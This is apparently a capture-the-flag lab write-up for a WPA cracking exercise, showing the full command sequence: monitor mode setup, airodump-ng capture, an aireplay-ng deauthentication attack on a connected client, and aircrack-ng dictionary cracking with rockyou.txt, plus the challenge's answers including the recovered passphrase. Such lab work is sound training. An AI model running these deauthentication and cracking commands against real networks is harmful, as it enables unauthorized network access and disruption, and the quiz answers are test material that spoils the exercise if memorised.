# Day 11: If you'd like to WPA, press the star key!

**Connection to the Machine:**
To begin, a virtual machine and AttackBox were utilized for the analysis.

Accessed the VM from the AttackBox via SSH with the following command, using the given credentials.

`ssh glitch@10.10.160.118`

![image](https://github.com/user-attachments/assets/5e249540-f5df-41e4-93be-915ed90db2a5)

## Approach:

**Ran the following commands:**

- `iw dev` : This will show any wireless devices and their configuration that we have available for us to use.

  ![image](https://github.com/user-attachments/assets/d72179fa-5591-4cd6-b2da-e55a3556528f)

  `BSSID` of our wireless interface: `02:00:00:00:02:00`.

- `sudo iw dev wlan2 scan` :  scanned for nearby Wi-Fi networks using our wlan2 device

  ![image](https://github.com/user-attachments/assets/8990b8e0-c66a-4fae-ae05-df3bd5eafc15)

  The `BSSID` and `SSID` of the device are `02:00:00:00:02:00` and `MalwareM_AP` respectively.

- ```
  sudo ip link set dev wlan2 down
  sudo iw dev wlan2 set type monitor
  sudo ip link set dev wlan2 up
  sudo iw dev wlan2 info 

Turned our device off, switched to monitor mode and then turned our device back on and confirmed that our interface is in monitor mode.

  ![image](https://github.com/user-attachments/assets/3fc8e98b-c9d5-4c37-b328-27c37305d12e)

- `sudo airodump-ng wlan2` : This command provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type.

  ![image](https://github.com/user-attachments/assets/9deb5d15-7d00-48cd-972b-0351e89fbd79)

    The `BSSID` and `SSID` of the **access ponit** are `02:00:00:00:00:00` and `MalwareM_AP` respectively.

- `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2` : This will capture the traffic of the access point. We will leave this command running and launch the attack on a second terminal.

  ![image](https://github.com/user-attachments/assets/ce0e7c02-6f59-4fd0-9156-06eb48b0916e)

  The `STATION` section shows the device's `BSSID` (MAC) of `02:00:00:00:01:00` that is already connected to the access point.

**Second terminal:**

- `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2` : The `-0` flag indicates that we are using the deauthentication attack, and the `1` value is the number of deauths to send. The `-a` indicates the BSSID of the access point and `-c` indicates the BSSID of the client to deauthenticate.

- `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap` : Using the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. Performs a dictionary attack in order to match the passphrase against each entry in a specified wordlist file(`rockyou.txt`).

  ![image](https://github.com/user-attachments/assets/24272112-ac6a-46bc-93e0-7348d669fd74)

  Key Found: `fluffy/champ24`

---

## Answers to the given questions:

What is the BSSID of our wireless interface?

```
02:00:00:00:02:00
```

---

What is the SSID and BSSID of the access point? Format: SSID, BSSID


```
MalwareM_AP, 02:00:00:00:00:00
```

---

What is the BSSID of the wireless interface that is already connected to the access point?


```
02:00:00:00:01:00
```

![image](https://github.com/user-attachments/assets/ce0e7c02-6f59-4fd0-9156-06eb48b0916e)

---

What is the PSK after performing the WPA cracking attack?


```
fluffy/champ24
```

---

![image](https://github.com/user-attachments/assets/3bed7918-52fd-461e-a1cb-df367beaf0c4)

